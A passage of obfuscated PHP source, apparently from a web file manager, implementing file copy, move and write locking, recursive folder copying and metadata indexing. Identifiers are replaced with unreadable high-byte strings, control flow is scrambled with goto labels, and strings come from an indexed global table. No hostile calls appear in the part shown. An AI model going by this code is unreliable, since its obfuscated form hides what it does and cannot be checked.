$b†¤Ó£Ô¨â[$bëÕÂ¦®¥[28]]; if ($b†¤Ó£Ô¨â[$bëÕÂ¦®¥[397]]) { $FÈˆéÔŠ‡ .= $bëÕÂ¦®¥[8]; } goto bÏÅŞİÈ¤·; eöà¢Í„ÎÎ: $AÕŒï–ÍàÁ = $this->parentLevelArray($b†¤Ó£Ô¨â[$bëÕÂ¦®¥[481]]); array_shift($AÕŒï–ÍàÁ); $FÈˆéÔŠ‡ = $D™ÁÎÄ; goto cøÊïàºÇ; d¨˜†ŠÏØŒ: if (!$b†¤Ó£Ô¨â[$bëÕÂ¦®¥[397]]) { $F”öÃ¶µó‹[$bëÕÂ¦®¥[441]] = $b†¤Ó£Ô¨â[$bëÕÂ¦®¥[441]]; $F”öÃ¶µó‹[$bëÕÂ¦®¥[85]] = $b†¤Ó£Ô¨â[$bëÕÂ¦®¥[75]]; } $D¥Ğ¿ªÄ¼ä[] = $F”öÃ¶µó‹; goto CÅİ§îƒëö; bÏÅŞİÈ¤·: $FÈˆéÔŠ‡ = str_replace($bëÕÂ¦®¥[490], $bëÕÂ¦®¥[8], $FÈˆéÔŠ‡); $FÈˆéÔŠ‡ = str_replace($bëÕÂ¦®¥[490], $bëÕÂ¦®¥[8], $FÈˆéÔŠ‡); $F”öÃ¶µó‹ = array($bëÕÂ¦®¥[408] => str_replace($bëÕÂ¦®¥[490], $bëÕÂ¦®¥[8], $FÈˆéÔŠ‡), $bëÕÂ¦®¥[512] => intval($b†¤Ó£Ô¨â[$bëÕÂ¦®¥[397]]), $bëÕÂ¦®¥[84] => $this->pathInfoFilter($b†¤Ó£Ô¨â)); goto d¨˜†ŠÏØŒ; CÅİ§îƒëö: } return $D¥Ğ¿ªÄ¼ä; goto FßÌØ‹ÕÉ; e†¦—­™–: $this->_listAppendAuth($A›ƒ°ƒÎÌ); $this->_listAppendUser($A›ƒ°ƒÎÌ); $this->_listAppendPath($A›ƒ°ƒÎÌ); goto Dì†š ëÌ„; FßÌØ‹ÕÉ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($C“£äê†œª) { goto B˜¡‘°·ˆ; B˜¡‘°·ˆ: $F— ¹‘šÔæ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->allowLock()) { return; } $this->_lockCheck($F— ¹‘šÔæ[513], $C“£äê†œª); goto AÚíøÆ¾Óº; EÓ¸Ëœºìó: $this->_lockEvent($C“£äê†œª, array($F— ¹‘šÔæ[516], $F— ¹‘šÔæ[517]), $C×¬ö™µê); $this->_lockCheckEnd($F— ¹‘šÔæ[513], $C“£äê†œª); goto CÑâ™İš“Ã; AÚíøÆ¾Óº: $C×¬ö™µê = 1; $this->_lockEvent($C“£äê†œª, array($F— ¹‘šÔæ[514], $F— ¹‘šÔæ[515]), $C×¬ö™µê); $this->_lockParent($C“£äê†œª, array($F— ¹‘šÔæ[515]), $C×¬ö™µê); goto EÓ¸Ëœºìó; CÑâ™İš“Ã: } public function lockCopyEnd($f¦Ç ±¸¼Œ) { $A¬èˆØ§õ¢ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->allowLock()) { return; } $B¸Í‚êÌ‡² = 0; $this->_lockEvent($f¦Ç ±¸¼Œ, array($A¬èˆØ§õ¢[514], $A¬èˆØ§õ¢[515]), $B¸Í‚êÌ‡²); $this->_lockParent($f¦Ç ±¸¼Œ, array($A¬èˆØ§õ¢[515]), $B¸Í‚êÌ‡²); $this->_lockEvent($f¦Ç ±¸¼Œ, array($A¬èˆØ§õ¢[516], $A¬èˆØ§õ¢[517]), $B¸Í‚êÌ‡²); } public function lockWriteStart($D‹èÙÄô†ç, $cè°®™ŒŠ = '') { goto aÄÓ»ƒ; aÄÓ»ƒ: $EÎ¡ã¡¦çË =& $_SERVER[¹Ò‹Ò¹]; if (!$this->allowLock()) { return; } $this->_lockCheck($EÎ¡ã¡¦çË[514], $D‹èÙÄô†ç); goto E²¶·èù‘; E²¶·èù‘: $d±åÏÁ¢± = 1; $this->_lockKey($EÎ¡ã¡¦çË[518] . $D‹èÙÄô†ç . $EÎ¡ã¡¦çË[94] . $cè°®™ŒŠ, $d±åÏÁ¢±); $this->_lockEvent($D‹èÙÄô†ç, array($EÎ¡ã¡¦çË[513], $EÎ¡ã¡¦çË[515]), $d±åÏÁ¢±); goto A­Ğ‰ÓÏ˜¦; A­Ğ‰ÓÏ˜¦: $this->_lockParent($D‹èÙÄô†ç, array($EÎ¡ã¡¦çË[513], $EÎ¡ã¡¦çË[515]), $d±åÏÁ¢±); $this->_lockCheckEnd($EÎ¡ã¡¦çË[514], $D‹èÙÄô†ç); goto bòÄï¸ë£µ; bòÄï¸ë£µ: } public function lockWriteEnd($dĞš‚âšÓÙ, $fÅ—–Œñ´ = '') { $cÒéÈ´§¢ç =& $_SERVER[¹Ò‹Ò¹]; if (!$this->allowLock()) { return; } $eÎèË Å­¸ = 0; $this->_lockKey($cÒéÈ´§¢ç[518] . $dĞš‚âšÓÙ . $cÒéÈ´§¢ç[94] . $fÅ—–Œñ´, $eÎèË Å­¸); $this->_lockEvent($dĞš‚âšÓÙ, array($cÒéÈ´§¢ç[513], $cÒéÈ´§¢ç[515]), $eÎèË Å­¸); $this->_lockParent($dĞš‚âšÓÙ, array($cÒéÈ´§¢ç[513], $cÒéÈ´§¢ç[515]), $eÎèË Å­¸); } public function lockMoveStart($cè†Ã‰‡¢º) { goto bõ×èêŞİê; BÛÄ²‰à‰«: $FßäŞ„À = 1; $this->_lockKey($D‹’ÕŒ—©ä[519] . $cè†Ã‰‡¢º, $FßäŞ„À); $this->_lockEvent($cè†Ã‰‡¢º, array($D‹’ÕŒ—©ä[513], $D‹’ÕŒ—©ä[514]), $FßäŞ„À); goto d‘¼‘‡©Ã‰; bõ×èêŞİê: $D‹’ÕŒ—©ä =& $_SERVER[¹Ò‹Ò¹]; if (!$this->allowLock()) { return; } $this->_lockCheck($D‹’ÕŒ—©ä[515], $cè†Ã‰‡¢º); goto BÛÄ²‰à‰«; d‘¼‘‡©Ã‰: $this->_lockParent($cè†Ã‰‡¢º, array($D‹’ÕŒ—©ä[513], $D‹’ÕŒ—©ä[515]), $FßäŞ„À); $this->_lockEvent($cè†Ã‰‡¢º, array($D‹’ÕŒ—©ä[520], $D‹’ÕŒ—©ä[516], $D‹’ÕŒ—©ä[517]), $FßäŞ„À); $this->_lockCheckEnd($D‹’ÕŒ—©ä[515], $cè†Ã‰‡¢º); goto eÚŒâÜòßè; eÚŒâÜòßè: } public function lockMoveEnd($c„øÒÕœµÍ) { goto bì˜È¾Ü»º; A¢¯£ä„ÌÅ: $this->_lockKey($cå£¾À‘ˆ[519] . $c„øÒÕœµÍ, $D©‡«Í÷³); $this->_lockEvent($c„øÒÕœµÍ, array($cå£¾À‘ˆ[513], $cå£¾À‘ˆ[514]), $D©‡«Í÷³); $this->_lockParent($c„øÒÕœµÍ, array($cå£¾À‘ˆ[513], $cå£¾À‘ˆ[515]), $D©‡«Í÷³); goto d‚è”Œ’­; d‚è”Œ’­: $this->_lockEvent($c„øÒÕœµÍ, array($cå£¾À‘ˆ[520], $cå£¾À‘ˆ[516], $cå£¾À‘ˆ[517]), $D©‡«Í÷³); goto A¶¡´¹ÛĞõ; bì˜È¾Ü»º: $cå£¾À‘ˆ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->allowLock()) { return; } $D©‡«Í÷³ = 0; goto A¢¯£ä„ÌÅ; A¶¡´¹ÛĞõ: } private function _lockCheck($f‰¼“Â¬¨º, $FØˆëÉ‰Ÿİ) { goto AéĞ†³ÕË¯; B„õ•ê®™: $F‘Œà…¶± = array_reverse($this->parentLevelArray($EöÂ£Ğİªµ[$E£‹×šá[481]])); foreach ($F‘Œà…¶± as $C¤Ä‹¢§è) { $C¯¯—Ê°® = $f‰¼“Â¬¨º . $E£‹×šá[522] . $C¤Ä‹¢§è; if (CacheLock::lockGet($E£‹×šá[523] . $C¯¯—Ê°®)) { $EöÂ£Ğİªµ = $this->sourceInfo($C¤Ä‹¢§è); CacheLock::setErrorMsg($E£‹×šá[159] . htmlspecialchars($EöÂ£Ğİªµ[$E£‹×šá[28]]) . $E£‹×šá[499] . $dÀñĞ°°ˆ); $this->_lockKey($C¯¯—Ê°®, 1); $this->_lockKey($C¯¯—Ê°®, 0); } } goto fœèçŒ”§; AéĞ†³ÕË¯: $E£‹×šá =& $_SERVER[¹Ò‹Ò¹]; $EöÂ£Ğİªµ = $this->sourceInfo($FØˆëÉ‰Ÿİ); $C¯¯—Ê°® = $f‰¼“Â¬¨º . $E£‹×šá[94] . $FØˆëÉ‰Ÿİ; goto aõ½ò÷´áè; aõ½ò÷´áè: $this->_lockTimeStart[$C¯¯—Ê°®] = timeFloat(); if (!is_array($EöÂ£Ğİªµ)) { return; } $dÀñĞ°°ˆ = LNG($E£‹×šá[521]); goto A¥¯ç‰æÅ; A¥¯ç‰æÅ: CacheLock::setErrorMsg($E£‹×šá[159] . htmlspecialchars($EöÂ£Ğİªµ[$E£‹×šá[28]]) . $E£‹×šá[499] . $dÀñĞ°°ˆ); $this->_lockKey($C¯¯—Ê°®, 1); $this->_lockKey($C¯¯—Ê°®, 0); goto B„õ•ê®™; fœèçŒ”§: } private function _lockCheckEnd($aÒÁª³Ò—•, $CìˆÏŠ‹•) { goto aßÅÑÆìÓ; aßÅÑÆìÓ: $fá…§´Ã” =& $_SERVER[¹Ò‹Ò¹]; $A©¾‚©Å† = $aÒÁª³Ò—• . $fá…§´Ã”[94] . $CìˆÏŠ‹•; CacheLock::setErrorMsg($fá…§´Ã”[373]); goto dœç£ĞÊí; D¯‘ÃÅË¡: if ($cµšãêèç > 0.5) { unset(self::$cacheSourceInfo[$fá…§´Ã”[432] . $CìˆÏŠ‹•]); } $FŠÈÖÕ‡¯÷ = $this->sourceInfo($CìˆÏŠ‹•); if (!$FŠÈÖÕ‡¯÷) { show_json(LNG($fá…§´Ã”[104]), !1); } goto f†³˜¢¢™ğ; dœç£ĞÊí: if (!isset($this->_lockTimeStart[$A©¾‚©Å†])) { return; } $cµšãêèç = timeFloat() - $this->_lockTimeStart[$A©¾‚©Å†]; unset($this->_lockTimeStart[$A©¾‚©Å†]); goto D¯‘ÃÅË¡; f†³˜¢¢™ğ: } private function _lockParent($Fˆ©ĞöîÁ‘, $fÉˆéÃ…·Ÿ, $c–å«îĞø†) { if (!$this->autoLockSet) { return; } $CËæ³˜Ç„ = $this->sourceInfo($Fˆ©ĞöîÁ‘); if (!is_array($CËæ³˜Ç„)) { return; } $e¶Ğ÷¼Óƒ˜ = array_reverse($this->parentLevelArray($CËæ³˜Ç„[$_SERVER[¹Ò‹Ò¹][481]])); foreach ($e¶Ğ÷¼Óƒ˜ as $e°æÄî¢í) { $this->_lockEvent($e°æÄî¢í, $fÉˆéÃ…·Ÿ, $c–å«îĞø†); } } private function _lockEvent($eÉÆ˜åÂİ, $DøöÏîŠ’¢, $C‘˜…¼°ê¼) { $Aõƒ±¿à‚• =& $_SERVER[¹Ò‹Ò¹]; if (!$this->autoLockSet) { return; } foreach ($DøöÏîŠ’¢ as $bºÎ†Ä ÆŠ) { $B¡˜ßí­ = $bºÎ†Ä ÆŠ . $Aõƒ±¿à‚•[94] . $eÉÆ˜åÂİ; if ($C‘˜…¼°ê¼ && CacheLock::lockGet($Aõƒ±¿à‚•[523] . $B¡˜ßí­)) { continue; } $this->_lockKey($B¡˜ßí­, $C‘˜…¼°ê¼); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($EÒô¤†Ç·ª, $eÊİé¬¦†¾ = 1) { $B´”·†ÅÓ‚ = $_SERVER[¹Ò‹Ò¹][523] . md5($EÒô¤†Ç·ª); if ($eÊİé¬¦†¾) { if (isset(self::$_lockItemArr[$B´”·†ÅÓ‚])) { return; } self::$_lockItemArr[$B´”·†ÅÓ‚] = 1; CacheLock::lock($B´”·†ÅÓ‚, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$B´”·†ÅÓ‚])) { return; } unset(self::$_lockItemArr[$B´”·†ÅÓ‚]); CacheLock::unlock($B´”·†ÅÓ‚); } } public function isParentOf($fƒÕØ•ÅâÛ, $cÂ¹¸ˆºö¾) { goto b‘›½«“ª; fö½È®²ä: return $FÛÈ¾±‹Š; goto E¯àÆ¡œë; b‘›½«“ª: $c«ÍÑËğÄÅ =& $_SERVER[¹Ò‹Ò¹]; $cëš¤°®öÛ = $this->sourceInfo($fƒÕØ•ÅâÛ); $f’ô‚òÀ‰¶ = $this->sourceInfo($cÂ¹¸ˆºö¾); goto e£ğ™±—Â‰; e£ğ™±—Â‰: $eÀº˜·‹¤½ = $cëš¤°®öÛ[$c«ÍÑËğÄÅ[481]] . $cëš¤°®öÛ[$c«ÍÑËğÄÅ[390]] . $c«ÍÑËğÄÅ[47]; $aà¼£õÕ¹• = $f’ô‚òÀ‰¶[$c«ÍÑËğÄÅ[481]] . $f’ô‚òÀ‰¶[$c«ÍÑËğÄÅ[390]] . $c«ÍÑËğÄÅ[47]; $FÛÈ¾±‹Š = strpos($aà¼£õÕ¹•, $eÀº˜·‹¤½) === 0; goto fö½È®²ä; E¯àÆ¡œë: } private $targetIsDelete = 0; public function copy($eßÛ°‘•Ğ•, $fÀ´á˜‡…², $AŸâ²É»ŞŸ = REPEAT_REPLACE, $E£‰¦ëò¸– = '') { goto dóÖ‹­ÁÛ•; bÆØé™·â™: if (!$aç²êÈÍ¨… || !$D¾“ƒÔ°ÅŸ || $D¾“ƒÔ°ÅŸ[$aÃ•õö™Êê[397]] != $aÃ•õö™Êê[86]) { return !1; } if ($this->isParentOf($eßÛ°‘•Ğ•, $fÀ´á˜‡…²)) { return !1; } $cîÊËèĞŠˆ = $E£‰¦ëò¸– ? $E£‰¦ëò¸– : $aç²êÈÍ¨…[$aÃ•õö™Êê[28]]; goto BÄù¦œ¡; aÆÏ†½¢Ë¤: $this->targetIsDelete = intval($aç²êÈÍ¨…[$aÃ•õö™Êê[417]]); $CåË†Ø„¥Ñ = $this->fileNameExistCache($fÀ´á˜‡…², $aç²êÈÍ¨…[$aÃ•õö™Êê[28]]); $c©™½ˆ†Û = $this->_copy($eßÛ°‘•Ğ•, $fÀ´á˜‡…², $AŸâ²É»ŞŸ, $aªäµÚôö°, !0, $E£‰¦ëò¸–); goto bàƒôíÈà•; bàƒôíÈà•: $this->_childrenListClear(); $this->lockCopyEnd($eßÛ°‘•Ğ•); $this->lockWriteEnd($fÀ´á˜‡…², $cîÊËèĞŠˆ); goto dî·ƒÎ®õ°; dî·ƒÎ®õ°: if ($aç²êÈÍ¨…[$aÃ•õö™Êê[397]] == $aÃ•õö™Êê[86] && $CåË†Ø„¥Ñ == $c©™½ˆ†Û) { $this->folderSizeResetChildren($CåË†Ø„¥Ñ); } Model($aÃ•õö™Êê[527])->addAll($aªäµÚôö°[$aÃ•õö™Êê[525]], array(), !0); if ($CåË†Ø„¥Ñ != $c©™½ˆ†Û || $aç²êÈÍ¨…[$aÃ•õö™Êê[397]] == $aÃ•õö™Êê[86]) { Model($aÃ•õö™Êê[528])->eventCopy($c©™½ˆ†Û); } goto D¯· ”©Êœ; aÎ‡ÒÖ®Ï×: $this->updateModifyTime($fÀ´á˜‡…²); return $c©™½ˆ†Û; goto e½ãÀ¬Û¯Å; BÄù¦œ¡: $this->lockCopyStart($eßÛ°‘•Ğ•); $this->lockWriteStart($fÀ´á˜‡…², $cîÊËèĞŠˆ); $aªäµÚôö° = array($aÃ•õö™Êê[524] => array(), $aÃ•õö™Êê[525] => array(), $aÃ•õö™Êê[526] => array()); goto aÆÏ†½¢Ë¤; dóÖ‹­ÁÛ•: $aÃ•õö™Êê =& $_SERVER[¹Ò‹Ò¹]; $aç²êÈÍ¨… = $this->sourceInfo($eßÛ°‘•Ğ•); $D¾“ƒÔ°ÅŸ = $this->sourceInfo($fÀ´á˜‡…²); goto bÆØé™·â™; D¯· ”©Êœ: $this->saveAll($aªäµÚôö°[$aÃ•õö™Êê[526]]); Model($aÃ•õö™Êê[191])->linkAdd($aªäµÚôö°[$aÃ•õö™Êê[524]]); $this->folderSizeReset($fÀ´á˜‡…²); goto aÎ‡ÒÖ®Ï×; e½ãÀ¬Û¯Å: } private function _copy($eÆÚƒÙé„Ö, $dÂä®˜â½à, $E£Üğì», &$d²ñöÊìÓø, $C†×ŒƒŠäé, $eä½ŸÊ¿¤ˆ = '') { goto FÊØ¿ÍÉÏ‰; d’ÖŒŠÍªÆ: $aÃ‚—¬ÛÂ = $eä½ŸÊ¿¤ˆ ? $eä½ŸÊ¿¤ˆ : $AˆÀ¿Ûƒçˆ[$eã ï”ƒÍ[28]]; $aÄË‘¹Ş†ğ = $this->fileNameExistCache($dÂä®˜â½à, $aÃ‚—¬ÛÂ); if ($C†×ŒƒŠäé) { $this->_childrenAllMake($eÆÚƒÙé„Ö); if ($FÂéŒ¿»ĞŠ && $aÄË‘¹Ş†ğ) { $this->_childrenAllMake($aÄË‘¹Ş†ğ); } } goto f£†À¹¡; f£†À¹¡: if (!$aÄË‘¹Ş†ğ) { return $this->_copyCreate($eÆÚƒÙé„Ö, $dÂä®˜â½à, $aÃ‚—¬ÛÂ, $d²ñöÊìÓø); } $fùÈˆ³õÛ‘ = $aÄË‘¹Ş†ğ; if ($FÂéŒ¿»ĞŠ) { if ($E£Üğì» == REPEAT_RENAME_FOLDER) { $aÃ‚—¬ÛÂ = $this->fileNameAutoCache($dÂä®˜â½à, $aÃ‚—¬ÛÂ, $E£Üğì», $FÂéŒ¿»ĞŠ); $fùÈˆ³õÛ‘ = $this->_copyCreate($eÆÚƒÙé„Ö, $dÂä®˜â½à, $aÃ‚—¬ÛÂ, $d²ñöÊìÓø); } else { $EëÀï ¸ŒÓ = $this->_childrenList($eÆÚƒÙé„Ö); foreach ($EëÀï ¸ŒÓ as $CÆ‚“«–µ³) { $this->_copy($CÆ‚“«–µ³[$eã ï”ƒÍ[390]], $aÄË‘¹Ş†ğ, $E£Üğì», $d²ñöÊìÓø, !1); } } } else { if ($E£Üğì» == REPEAT_RENAME || $E£Üğì» == REPEAT_RENAME_FOLDER) { $aÃ‚—¬ÛÂ = $this->fileNameAutoCache($dÂä®˜â½à, $aÃ‚—¬ÛÂ, $E£Üğì», $FÂéŒ¿»ĞŠ); $fùÈˆ³õÛ‘ = $this->_copyCreate($eÆÚƒÙé„Ö, $dÂä®˜â½à, $aÃ‚—¬ÛÂ, $d²ñöÊìÓø); } else { if ($E£Üğì» == REPEAT_REPLACE) { $bÕò—îˆ† = $this->sourceInfoCache($aÄË‘¹Ş†ğ); $C¹â¾ò×Ò = $this->fileHistory($bÕò—îˆ†, $AˆÀ¿Ûƒçˆ[$eã ï”ƒÍ[441]], $AˆÀ¿Ûƒçˆ[$eã ï”ƒÍ[77]]); if ($C¹â¾ò×Ò) { $d²ñöÊìÓø[$eã ï”ƒÍ[524]][] = $AˆÀ¿Ûƒçˆ[$eã ï”ƒÍ[441]]; } } else { if ($E£Üğì» == REPEAT_SKIP) { } } } Hook::trigger($eã ï”ƒÍ[529], array($eã ï”ƒÍ[530], $AˆÀ¿Ûƒçˆ, 0)); } goto eáÆµÒÈµ¾; eáÆµÒÈµ¾: return $fùÈˆ³õÛ‘; goto e±æÓÂµ«ù; FÊØ¿ÍÉÏ‰: $eã ï”ƒÍ =& $_SERVER[¹Ò‹Ò¹]; $AˆÀ¿Ûƒçˆ = $this->sourceInfoCache($eÆÚƒÙé„Ö); $FÂéŒ¿»ĞŠ = $AˆÀ¿Ûƒçˆ[$eã ï”ƒÍ[397]] == $eã ï”ƒÍ[86]; goto d’ÖŒŠÍªÆ; e±æÓÂµ«ù: } private function _copyCreate($Fí÷ÅºŸº¶, $F…ËÜ§ùøË, $b…»¨â±á, &$Aº»—Ç“ÕĞ) { goto DÑ‹İÄå•; d˜àÊä½¢Ö: $this->chunkEventSet($C•±¸šÚŠ[538], array($C•±¸šÚŠ[539], $f‘‚Ê¤É‘¬, $cÆºó²»øÈ)); $this->saveAll($dŸ¦õ…ÆÕ); return $AÇÜ‘á‘–È; goto Dí¡“íŞ¯…; F†Ë”¾— »: $Fæòî‘òƒÆ[$Fí÷ÅºŸº¶] = $AÇÜ‘á‘–È; $cÖ‚ªà­¾Ğ = array(); $dŸ¦õ…ÆÕ = array(); goto b¯¾ÆÛ“‡ˆ; Bï„ª…Ø£Ê: $f‘‚Ê¤É‘¬ = $this->_makeItemData($A„Èáí¦ˆÜ, $bñøö®ÀÓ¼, $b…»¨â±á); Hook::trigger($C•±¸šÚŠ[531], $f‘‚Ê¤É‘¬); Hook::trigger($C•±¸šÚŠ[532], array($C•±¸šÚŠ[533], $f‘‚Ê¤É‘¬, 0)); goto D„‚†ƒŠÚ; b¯¾ÆÛ“‡ˆ: foreach ($dÇƒŠ™…É˜ as $FêïäÄ½°œ) { $Eñ‘øäÔ„í = $FêïäÄ½°œ[$C•±¸šÚŠ[390]]; $BÔ‚ä ‡Èä = $this->_childrenMatch($Fæòî‘òƒÆ, $FêïäÄ½°œ, $Fø–¨ŞĞ­); $cÖ‚ªà­¾Ğ[] = array($C•±¸šÚŠ[390], $Eñ‘øäÔ„í, $C•±¸šÚŠ[472], $BÔ‚ä ‡Èä[$C•±¸šÚŠ[472]]); $dŸ¦õ…ÆÕ[] = array($C•±¸šÚŠ[390], $Eñ‘øäÔ„í, $C•±¸šÚŠ[481], $BÔ‚ä ‡Èä[$C•±¸šÚŠ[481]]); $this->_copyApplyMeta($FêïäÄ½°œ, $Aº»—Ç“ÕĞ); if ($FêïäÄ½°œ[$C•±¸šÚŠ[397]] != $C•±¸šÚŠ[86]) { $Aº»—Ç“ÕĞ[$C•±¸šÚŠ[524]][] = $FêïäÄ½°œ[$C•±¸šÚŠ[441]]; } } $this->chunkEventSet($C•±¸šÚŠ[536], array($C•±¸šÚŠ[537], $f‘‚Ê¤É‘¬, $cÆºó²»øÈ)); $this->saveAll($cÖ‚ªà­¾Ğ); goto d˜àÊä½¢Ö; DŞöÄš¿ˆ: if ($A„Èáí¦ˆÜ[$C•±¸šÚŠ[397]] != $C•±¸šÚŠ[86]) { $Aº»—Ç“ÕĞ[$C•±¸šÚŠ[524]][] = $A„Èáí¦ˆÜ[$C•±¸šÚŠ[441]]; return $AÇÜ‘á‘–È; } $EæÖ™ŸËÄŞ = array(); $EÔİâ‹¼‘ù = array(); goto fïõëá½Üö; DÑ‹İÄå•: $C•±¸šÚŠ =& $_SERVER[¹Ò‹Ò¹]; $A„Èáí¦ˆÜ = $this->sourceInfoCache($Fí÷ÅºŸº¶); $bñøö®ÀÓ¼ = $this->sourceInfoCache($F…ËÜ§ùøË); goto Bï„ª…Ø£Ê; D„‚†ƒŠÚ: $AÇÜ‘á‘–È = $this->add($f‘‚Ê¤É‘¬); $C•Îàè‰´¶ = array($C•±¸šÚŠ[390] => $AÇÜ‘á‘–È, $C•±¸šÚŠ[28] => $b…»¨â±á); $this->_copyApplyMeta($C•Îàè‰´¶, $Aº»—Ç“ÕĞ); goto DŞöÄš¿ˆ; fïõëá½Üö: $this->_childrenListAll($Fí÷ÅºŸº¶, $EæÖ™ŸËÄŞ); $cÆºó²»øÈ = count($EæÖ™ŸËÄŞ); if ($cÆºó²»øÈ == 0) { return $AÇÜ‘á‘–È; } goto B÷ì¸îÛàÏ; B÷ì¸îÛàÏ: $Fø–¨ŞĞ­ = $this->sourceInfo($AÇÜ‘á‘–È); foreach ($EæÖ™ŸËÄŞ as $FêïäÄ½°œ) { $D´™×ÆŸ = $this->_makeItemData($FêïäÄ½°œ, $Fø–¨ŞĞ­, $FêïäÄ½°œ[$C•±¸šÚŠ[28]]); $D´™×ÆŸ[$C•±¸šÚŠ[481]] = $FêïäÄ½°œ[$C•±¸šÚŠ[481]]; $EÔİâ‹¼‘ù[] = $D´™×ÆŸ; } $this->chunkEventSet($C•±¸šÚŠ[534], array($C•±¸šÚŠ[535], $f‘‚Ê¤É‘¬, $cÆºó²»øÈ)); goto bØ‰ÒÆó‹ã; bØ‰ÒÆó‹ã: $this->addAll($EÔİâ‹¼‘ù, array(), !1); $dÇƒŠ™…É˜ = $this->where(array($C•±¸šÚŠ[472] => $AÇÜ‘á‘–È))->select(); $Fæòî‘òƒÆ = $this->_childrenMakeRelation($EæÖ™ŸËÄŞ, $dÇƒŠ™…É˜); goto F†Ë”¾— »; Dí¡“íŞ¯…: } private function _childrenMakeRelation($b©å—Ûä—, $B„Ñàßïö) { $bì±¿¬«š =& $_SERVER[¹Ò‹Ò¹]; $fÕÎÔÏÅ« = array(); $b“›â¶á´ = array(); foreach ($b©å—Ûä— as $B–·Ğ´¾”‰) { $fä­éã—¸ = $B–·Ğ´¾”‰[$bì±¿¬«š[28]] . $bì±¿¬«š[8] . $B–·Ğ´¾”‰[$bì±¿¬«š[481]]; $fÕÎÔÏÅ«[$fä­éã—¸] = $B–·Ğ´¾”‰[$bì±¿¬«š[390]]; } foreach ($B„Ñàßïö as $B–·Ğ´¾”‰) { $fä­éã—¸ = $B–·Ğ´¾”‰[$bì±¿¬«š[28]] . $bì±¿¬«š[8] . $B–·Ğ´¾”‰[$bì±¿¬«š[481]]; $BÖˆÔ²ãñ¬ = $fÕÎÔÏÅ«[$fä­éã—¸]; $b“›â¶á´[$BÖˆÔ²ãñ¬] = $B–·Ğ´¾”‰[$bì±¿¬«š[390]]; } return $b“›â¶á´; } private function _childrenMatch($Aæ ÙƒîÒÏ, $Eó¾ÇÃÕŒÇ, $C‡•ÄôÄÏå) { goto D«µÇÅÌ‚¤; A®¤äœà: foreach ($cŠÕŒå‚ï as $dÉ¯°¤è) { if (isset($Aæ ÙƒîÒÏ[$dÉ¯°¤è])) { $F”ö¶’¯Ûø .= $Aæ ÙƒîÒÏ[$dÉ¯°¤è] . $Bİ¼»ª÷Õ[540]; } } $F”ö¶’¯Ûø = rtrim($F”ö¶’¯Ûø, $Bİ¼»ª÷Õ[47]) . $Bİ¼»ª÷Õ[47]; $Bù””î·†³ = $this->parentLevelArray($F”ö¶’¯Ûø); goto CÇ¾¹øƒŠÄ; D«µÇÅÌ‚¤: $Bİ¼»ª÷Õ =& $_SERVER[¹Ò‹Ò¹]; $F”ö¶’¯Ûø = $C‡•ÄôÄÏå[$Bİ¼»ª÷Õ[481]]; $cŠÕŒå‚ï = $this->parentLevelArray($Eó¾ÇÃÕŒÇ[$Bİ¼»ª÷Õ[481]]); goto A®¤äœà; CÇ¾¹øƒŠÄ: $AâÆ†Ïá¼ = $Bù””î·†³[count($Bù””î·†³) - 1]; return array($Bİ¼»ª÷Õ[472] => $AâÆ†Ïá¼, $Bİ¼»ª÷Õ[481] => $F”ö¶’¯Ûø); goto d­ÍÊ¼ƒ£„; d­ÍÊ¼ƒ£„: } private function _makeItemData($b»´¿Ïˆ¶, $CÈ¸§‰ãÜ•, $bíçùìÓ) { $f¢Ş†‘™ã÷ =& $_SERVER[¹Ò‹Ò¹]; $D§ÃèŒ”Œ = array($f¢Ş†‘™ã÷[541] => $b»´¿Ïˆ¶[$f¢Ş†‘™ã÷[397]], $f¢Ş†‘™ã÷[407] => $bíçùìÓ, $f¢Ş†‘™ã÷[542] => $b»´¿Ïˆ¶[$f¢Ş†‘™ã÷[399]], $f¢Ş†‘™ã÷[442] => $b»´¿Ïˆ¶[$f¢Ş†‘™ã÷[441]], $f¢Ş†‘™ã÷[543] => $b»´¿Ïˆ¶[$f¢Ş†‘™ã÷[77]], $f¢Ş†‘™ã÷[544] => $CÈ¸§‰ãÜ•[$f¢Ş†‘™ã÷[398]], $f¢Ş†‘™ã÷[545] => $CÈ¸§‰ãÜ•[$f¢Ş†‘™ã÷[478]], $f¢Ş†‘™ã÷[546] => USER_ID, $f¢Ş†‘™ã÷[547] => USER_ID, $f¢Ş†‘™ã÷[389] => $CÈ¸§‰ãÜ•[$f¢Ş†‘™ã÷[390]], $f¢Ş†‘™ã÷[548] => $CÈ¸§‰ãÜ•[$f¢Ş†‘™ã÷[481]] . $CÈ¸§‰ãÜ•[$f¢Ş†‘™ã÷[390]] . $f¢Ş†‘™ã÷[47], $f¢Ş†‘™ã÷[416] => 0, $f¢Ş†‘™ã÷[549] => $f¢Ş†‘™ã÷[33]); return $D§ÃèŒ”Œ; } private function _copyApplyMeta($B‚™ñáÛŸĞ, &$f—Ş—Õ÷ª) { $CÊÙ‘î»È· =& $_SERVER[¹Ò‹Ò¹]; $cí‡ŠÔ¸’» = $B‚™ñáÛŸĞ[$CÊÙ‘î»È·[390]]; $e«˜”Úç¸ = $B‚™ñáÛŸĞ[$CÊÙ‘î»È·[28]]; if (!isset($B‚™ñáÛŸĞ[$CÊÙ‘î»È·[550]]) || !$B‚™ñáÛŸĞ[$CÊÙ‘î»È·[550]] || $B‚™ñáÛŸĞ[$CÊÙ‘î»È·[550]] == $CÊÙ‘î»È·[491]) { $f—Ş—Õ÷ª[$CÊÙ‘î»È·[526]][] = array($CÊÙ‘î»È·[390], $cí‡ŠÔ¸’», $CÊÙ‘î»È·[550], short_id($cí‡ŠÔ¸’»)); } if (Input::check($e«˜”Úç¸, $CÊÙ‘î»È·[551])) { $f—Ş—Õ÷ª[$CÊÙ‘î»È·[525]][] = array($CÊÙ‘î»È·[390] => $cí‡ŠÔ¸’», $CÊÙ‘î»È·[92] => $CÊÙ‘î»È·[438], $CÊÙ‘î»È·[370] => str_replace($CÊÙ‘î»È·[50], $CÊÙ‘î»È·[33], Pinyin::encode($e«˜”Úç¸))); $f—Ş—Õ÷ª[$CÊÙ‘î»È·[525]][] = array($CÊÙ‘î»È·[390] => $cí‡ŠÔ¸’», $CÊÙ‘î»È·[92] => 